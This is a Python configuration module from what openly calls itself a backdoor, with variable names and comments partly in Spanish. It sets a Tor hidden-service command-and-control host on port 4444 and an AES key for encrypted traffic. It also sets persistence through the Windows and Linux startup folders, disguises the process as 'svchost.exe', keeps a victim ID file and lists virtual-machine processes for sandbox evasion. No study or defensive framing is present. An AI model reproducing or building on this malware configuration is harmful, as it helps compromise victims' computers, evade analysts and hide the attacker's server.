# core/config.py
import os

# Cambia por la dirección .onion de tu servidor C2 oculto
C2_HOST = os.environ.get("BACKDOORS_C2_HOST", "YOUR_C2_HIDDEN_SERVICE.onion")
C2_PORT = 4444

_aes_raw = os.environ.get("BACKDOORS_AES_KEY", "CHANGE_ME_32_BYTES_LONG_KEY_HERE")
AES_KEY = _aes_raw.encode("utf-8") if isinstance(_aes_raw, str) else _aes_raw
assert len(AES_KEY) == 32, "BACKDOORS_AES_KEY must be exactly 32 bytes"

WIN_STARTUP = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
LINUX_STARTUP = "~/.config/autostart"
NOMBRE_PROC_FAKE = "svchost.exe"
VICTIM_ID_FILE = ".bdid"

SOCKET_TIMEOUT = 15
BUFFER_SIZE = 65536

BLACKLIST_PROCESOS_VM = [
    "VBoxService.exe", "VBoxTray.exe", "vmtoolsd.exe", "vmwareuser.exe",
    "qemu-ga.exe", "prl_cc.exe", "xenservice.exe", "vboxservice", "vboxtray",
    "vmtoolsd", "vmwareuser", "qemu-ga", "prl_cc", "xenservice"
]

# OPCIONAL: permite alternar entre conexión directa y por TOR (para debug/desarrollo)
USE_TOR_SOCKS = True
TOR_SOCKS_HOST = "127.0.0.1"
TOR_SOCKS_PORT = 9050
